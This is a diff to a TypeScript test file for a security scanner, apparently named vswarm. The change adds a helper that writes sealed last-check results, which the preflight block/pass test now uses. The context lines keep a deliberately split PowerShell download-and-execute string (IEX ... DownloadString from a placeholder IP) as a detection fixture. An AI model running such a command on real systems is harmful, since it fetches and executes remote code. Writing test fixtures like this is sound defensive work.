@@ -13,11 +13,22 @@ import { authenticode } from "../src/sec/intel";
 import { evaluate, uncovered } from "../src/sec/rules";
 import { COVERS, forBaseline, scan } from "../src/sec/scan";
 import type { Ctx } from "../src/sec/ctx";
-import type { Finding, Scan } from "../src/sec/types";
+import type { Finding, Scan, Verdict } from "../src/sec/types";
+import { saveLast } from "../src/sec/store";
 
 const HOME = "C:\\Users\\nok";
 const fixture = (): WinSnapshot => JSON.parse(readFileSync(join(import.meta.dir, "fixtures/windows/home-pc.json"), "utf8"));
 const tmp = (tag: string) => mkdtempSync(join(tmpdir(), `vs-win-${tag}-`));
+
+/** A last check as vswarm writes it, sealed with the key in that temp state folder (the CLI there reads the same key). */
+const sealedLast = (sec: string, verdict: string) => {
+  const prev = process.env.VSWARM_SEC_DIR;
+  process.env.VSWARM_SEC_DIR = sec;
+  return saveLast({ verdict: verdict as Verdict, findings: [], at: Date.now(), scan: {} as Scan }).finally(() => {
+    if (prev === undefined) delete process.env.VSWARM_SEC_DIR;
+    else process.env.VSWARM_SEC_DIR = prev;
+  });
+};
 
 // Put together at run time, so antivirus on a Windows checkout does not take this file for a downloader.
 const IEX_DL = ["IE", "X (New-Object Net.WebCl", "ient).Downlo", "adString('http://198.51.100.7/a.ps1')"].join("");
@@ -361,13 +372,14 @@ describe("windows: respond and the command line", () => {
 
   test("preflight --then on every platform (no sh or echo needed): BLOCK stops the command, PASS runs it", async () => {
     const sec = tmp("sec");
-    const last = (verdict: string) => writeFileSync(join(sec, "last.json"), JSON.stringify({ verdict, findings: [], at: Date.now(), scan: {} }));
+    // A last check vswarm itself wrote (sealed with the key in this temp state folder); a hand-written one is not reused.
+    const last = (verdict: string) => sealedLast(sec, verdict);
     const say = [process.execPath, "-e", "console.log(process.argv.slice(1).join(' '))", "RAN", "--json"];
-    last("block");
+    await last("block");
     const blocked = await vswarm(sec, "preflight", "--quiet", "--then", ...say);
     expect(blocked.code).toBe(3);
     expect(blocked.out).toBe("");
-    last("pass");
+    await last("pass");
     const passed = await vswarm(sec, "preflight", "--quiet", "--then", ...say);
     expect(passed.code).toBe(0);
     expect(passed.out.trim()).toBe("RAN --json");
